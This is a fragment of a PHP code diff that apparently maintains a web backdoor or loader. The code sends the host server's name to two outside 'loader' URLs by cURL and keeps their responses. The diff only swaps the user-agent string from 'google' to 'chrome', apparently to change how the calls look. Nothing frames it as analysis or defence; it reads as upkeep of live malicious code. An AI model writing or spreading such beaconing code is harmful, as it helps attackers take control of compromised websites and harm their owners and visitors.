@@ -7,7 +7,7 @@ if($sayi == 1)
  curl_setopt_array($curl2, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'http://www.goldenspace.in//loader/index.php?s='.$_SERVER["SERVER_NAME"].'',
-    CURLOPT_USERAGENT => 'google'
+    CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp2 = curl_exec($curl2);
  curl_close($curl2);
@@ -22,7 +22,7 @@ if($sayi == 1)
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'http://routes.lk/load/index.php?s='.$_SERVER["SERVER_NAME"].'',
-    CURLOPT_USERAGENT => 'google'
+    CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
